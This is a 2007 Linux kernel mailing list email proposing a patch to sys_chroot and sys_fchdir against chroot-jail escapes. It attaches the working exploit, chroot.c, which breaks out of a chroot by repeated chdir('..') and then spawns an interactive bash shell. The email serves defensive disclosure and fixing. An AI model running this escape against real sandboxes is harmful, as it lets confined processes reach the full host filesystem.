Return-Path: <linux-kernel-owner+w=401wt.eu-S1756306AbXISH7Y@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1756306AbXISH7Y (ORCPT <rfc822;w@1wt.eu>);
	Wed, 19 Sep 2007 03:59:24 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1752918AbXISH7P
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 19 Sep 2007 03:59:15 -0400
Received: from mail.sousedi.net ([85.132.167.140]:49248 "EHLO mail.sousedi.net"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1752536AbXISH7O (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Wed, 19 Sep 2007 03:59:14 -0400
X-Greylist: delayed 2160 seconds by postgrey-1.27 at vger.kernel.org; Wed, 19 Sep 2007 03:59:13 EDT
Message-ID: <46F0CD96.9030807@prepere.com>
Date: Wed, 19 Sep 2007 09:19:50 +0200
From: majkls <majkls@prepere.com>
User-Agent: IceDove 1.5.0.12 (X11/20070607)
MIME-Version: 1.0
To: bunk@fs.tum.de
CC: linux-kernel@vger.kernel.org
Subject: sys_chroot+sys_fchdir Fix
Content-Type: multipart/mixed;
 boundary="------------000500090404070005010605"
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

This is a multi-part message in MIME format.
--------------000500090404070005010605
Content-Type: text/plain; charset=ISO-8859-2; format=flowed
Content-Transfer-Encoding: 7bit

Hello,
here is an fix to an exploit (obtained somewhere in internet). This 
exploit can workaround chroot with CAP_SYS_CHROOT. It is also possible 
(with sufficient filedescriptor (if there is na directory fd opened in 
root) workaround chroot with sys_fchdir. This patch fixes it.

Miloslav Semler

--------------000500090404070005010605
Content-Type: text/x-diff;
 name="sys_chroot+sys_fchdir.patch"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="sys_chroot+sys_fchdir.patch"

diff -Nrp linux-2.6.16.53/fs/namei.c linux-2.6.16.53-new/fs/namei.c
*** linux-2.6.16.53/fs/namei.c	2007-07-25 23:05:45.000000000 +0200
--- linux-2.6.16.53-new/fs/namei.c	2007-09-15 16:13:50.000000000 +0200
*************** static __always_inline void follow_dotdo
*** 728,733 ****
--- 728,772 ----
  	}
  	follow_mount(&nd->mnt, &nd->dentry);
  }
+ long directory_is_out(struct vfsmount *wdmnt, struct dentry *wdentry,
+ 		struct vfsmount *rootmnt, struct dentry *root)
+ {
+ 	struct nameidata oldentry, newentry;
+ 	long ret = 1;
+ 	
+         read_lock(&current->fs->lock);
+ 	oldentry.dentry = dget(wdentry);
+ 	oldentry.mnt = mntget(wdmnt);
+         read_unlock(&current->fs->lock);
+ 	newentry.dentry = oldentry.dentry;
+ 	newentry.mnt = oldentry.mnt;
+ 	
+ 	follow_dotdot(&newentry);
+ 	/* check it */
+ 	if(newentry.dentry == root && 
+ 		newentry.mnt == rootmnt){
+ 		ret = 0;
+ 		goto out;
+ 	}
+ 	
+ 	while(oldentry.mnt != newentry.mnt ||
+ 		oldentry.dentry != newentry.dentry){
+ 		
+ 		memcpy(&oldentry, &newentry, sizeof(struct nameidata));
+ 		follow_dotdot(&newentry);
+ 		
+ 		/* check it */
+ 		if(newentry.dentry == root && 
+ 			newentry.mnt == rootmnt){
+ 			ret = 0;
+ 			goto out;
+ 		}
+ 	}
+ out:
+ 	dput(newentry.dentry);
+ 	mntput(newentry.mnt);
+ 	return ret;
+ }
  
  /*
   *  It's more convoluted than I'd like it to be, but... it's still fairly
diff -Nrp linux-2.6.16.53/fs/open.c linux-2.6.16.53-new/fs/open.c
*** linux-2.6.16.53/fs/open.c	2007-07-25 23:05:45.000000000 +0200
--- linux-2.6.16.53-new/fs/open.c	2007-09-15 16:14:52.000000000 +0200
*************** dput_and_out:
*** 560,565 ****
--- 560,567 ----
  out:
  	return error;
  }
+ long directory_is_out(struct vfsmount *, struct dentry*, 
+ 		struct vfsmount *, struct dentry *);
  
  asmlinkage long sys_fchdir(unsigned int fd)
  {
*************** asmlinkage long sys_fchdir(unsigned int 
*** 581,586 ****
--- 583,591 ----
  	error = -ENOTDIR;
  	if (!S_ISDIR(inode->i_mode))
  		goto out_putf;
+ 	if (directory_is_out(mnt, dentry, current->fs->rootmnt, 
+ 				current->fs->root))
+ 		goto out_putf;
  
  	error = file_permission(file, MAY_EXEC);
  	if (!error)
*************** out:
*** 594,600 ****
  asmlinkage long sys_chroot(const char __user * filename)
  {
  	struct nameidata nd;
! 	int error;
  
  	error = __user_walk(filename, LOOKUP_FOLLOW | LOOKUP_DIRECTORY | LOOKUP_NOALT, &nd);
  	if (error)
--- 599,605 ----
  asmlinkage long sys_chroot(const char __user * filename)
  {
  	struct nameidata nd;
! 	int error, set_wd = 0;
  
  	error = __user_walk(filename, LOOKUP_FOLLOW | LOOKUP_DIRECTORY | LOOKUP_NOALT, &nd);
  	if (error)
*************** asmlinkage long sys_chroot(const char __
*** 607,615 ****
--- 612,631 ----
  	error = -EPERM;
  	if (!capable(CAP_SYS_CHROOT))
  		goto dput_and_out;
+ 	error = -ENOTDIR;
+ 	/*
+ 	if (directory_is_out(nd.mnt, nd.dentry, current->fs->rootmnt,
+ 				current->fs->root))
+ 		goto dput_and_out;
+ 		*/
+ 	set_wd = directory_is_out(current->fs->pwdmnt, current->fs->pwd, 
+ 				nd.mnt, nd.dentry);
  
  	set_fs_root(current->fs, nd.mnt, nd.dentry);
  	set_fs_altroot();
+ 	/* if wd is out, reset it to . */
+ 	if(set_wd)
+ 		set_fs_pwd(current->fs, nd.mnt, nd.dentry);
  	error = 0;
  dput_and_out:
  	path_release(&nd);

--------------000500090404070005010605
Content-Type: text/x-csrc;
 name="chroot.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="chroot.c"

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>  
#include <fcntl.h>  
#include <string.h>  
#include <unistd.h>  
#include <sys/stat.h>  
#include <sys/types.h>  
  	    
  	 /*  
  	 ** You should set NEED_FCHDIR to 1 if the chroot() on your  
  	 ** system changes the working directory of the calling  
  	 ** process to the same directory as the process was chroot()ed  
  	 ** to.  
  	 **  
  	 ** It is known that you do not need to set this value if you  
  	 ** running on Solaris 2.7 and below.  
  	 **  
  	 */  
  	 /*#define NEED_FCHDIR 0*/
  	    
  	 #define TEMP_DIR "waterbuffalo"  
  	    
  	 /* Break out of a chroot() environment in C */  
  	    
  	 int main() {  
  	   int x;            /* Used to move up a directory tree */  
  	   int done=0;       /* Are we done yet ? */  
  	 #ifdef NEED_FCHDIR  
  	   int dir_fd;       /* File descriptor to directory */  
  	 #endif  
  	   struct stat sbuf; /* The stat() buffer */  
  	   puts("chroot()");
	   chroot(".");  
  	  /* chdir("/");
	  setuid(65534); */
  	 /*  
  	 ** First we create the temporary directory if it doesn't exist  
  	 */  
  	 
	   if (stat(TEMP_DIR,&sbuf)<0) {  
  	     if (errno==ENOENT) {  
  	       if (mkdir(TEMP_DIR,0755)<0) {  
  	         fprintf(stderr,"Failed to create %s - %s\n", TEMP_DIR,  
  	                 strerror(errno));  
  	         exit(1);  
  	       }  
  	     } else {  
  	       fprintf(stderr,"Failed to stat %s - %s\n", TEMP_DIR,  
  	               strerror(errno));  
  	       exit(1);  
  	     }  
  	   } else if (!S_ISDIR(sbuf.st_mode)) {  
  	     fprintf(stderr,"Error - %s is not a directory!\n",TEMP_DIR);  
  	     exit(1);  
  	   }  
  	  
  	 #ifdef NEED_FCHDIR  
  	 /*  
  	 ** Now we open the current working directory  
  	 **  
  	 ** Note: Only required if chroot() changes the calling program's  
  	 **       working directory to the directory given to chroot().  
  	 **  
  	 */  
  	   if ((dir_fd=open(".",O_RDONLY))<0) {  
  	     fprintf(stderr,"Failed to open \".\" for reading - %s\n",  
  	             strerror(errno));  
  	     exit(1);  
  	   }  
  	 #endif  
  	    
  	 /*  
  	 ** Next we chroot() to the temporary directory  
  	 */  
  	   if (chroot(TEMP_DIR)<0) {  
  	     fprintf(stderr,"Failed to chroot to %s - %s\n",TEMP_DIR,  
  	             strerror(errno));  
  	     exit(1);  
  	   }  
  	    
  	 #ifdef NEED_FCHDIR  
  	 /*  
  	 ** Partially break out of the chroot by doing an fchdir()  
  	 **  
  	 ** This only partially breaks out of the chroot() since whilst  
  	 ** our current working directory is outside of the chroot() jail,  
  	 ** our root directory is still within it. Thus anything which refers  
  	 ** to "/" will refer to files under the chroot() point.  
  	 **  
  	 ** Note: Only required if chroot() changes the calling program's  
  	 **       working directory to the directory given to chroot().  
  	 **  
  	 */  
  	   if (fchdir(dir_fd)<0) {  
  	     fprintf(stderr,"Failed to fchdir - %s\n",  
  	             strerror(errno));  
  	     exit(1);  
  	   }  
  	   close(dir_fd);  
  	 #endif  
  	    
  	 /*  
  	 ** Completely break out of the chroot by recursing up the directory  
  	 ** tree and doing a chroot to the current working directory (which will  
  	 ** be the real "/" at that point). We just do a chdir("..") lots of  
  	 ** times (1024 times for luck :). If we hit the real root directory before  
  	 ** we have finished the loop below it doesn't matter as .. in the root  
  	 ** directory is the same as . in the root.  
  	 **  
  	 ** We do the final break out by doing a chroot(".") which sets the root  
  	 ** directory to the current working directory - at this point the real  
  	 ** root directory.  
  	 */  
  	   for(x=0;x<1024;x++) {  
  	     chdir("..");  
  	   }  
  	   chroot(".");  
  	    
  	 /*  
  	 ** We're finally out - so exec a shell in interactive mode  
  	 */  
  	   if (execl("/bin/bash","-i",NULL)<0) {  
  	     fprintf(stderr,"Failed to exec - %s\n",strerror(errno));  
  	     exit(1);  
  	   }  
  	 }  

--------------000500090404070005010605--
